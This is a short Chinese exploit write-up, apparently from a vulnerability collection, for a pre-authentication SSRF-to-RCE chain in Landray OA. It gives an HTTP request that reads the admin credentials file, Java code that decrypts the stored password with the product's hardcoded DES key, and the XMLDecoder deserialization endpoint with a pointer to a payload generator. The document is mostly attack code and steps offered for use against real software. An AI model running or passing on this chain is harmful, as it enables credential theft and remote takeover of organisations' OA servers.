# 蓝凌OA 前台 SSRF 到 RCE

详情分析可以见：https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ

SSRF 漏洞位置： /sys/ui/extend/varkind/custom.jsp

读password:


```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 
...

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```

解密：


```
import com.landray.kmss.util.DESEncrypt;

public class main {
    public static void main(String[] args) {
        String password = "mqwEyqHLj9PQXpy+yhf4z92SejWx+VeS";
        String resul=doPasswordDecrypt(password);
        System.out.println(resul);

    }
    public static String doPasswordDecrypt(String password) {
        try {
            DESEncrypt des = new DESEncrypt("kmssAdminKey");
            return des.decryptString(password);
        } catch (Exception ex) {
            try {
                DESEncrypt des0 = new DESEncrypt("kmssAdminKey", true);
                return des0.decryptString(password);
            } catch (Exception e) {
                return "ヾﾉ≧∀≦)o";
            }
        }
    }
}

```

解密后得到明文密码登录后使用xmldecoder反序列化.


```
/sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&fdParameters=<payload>
```

XMLDecoder-payload-generator生成payload: https://github.com/mhaskar/XMLDecoder-payload-generator

from：https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ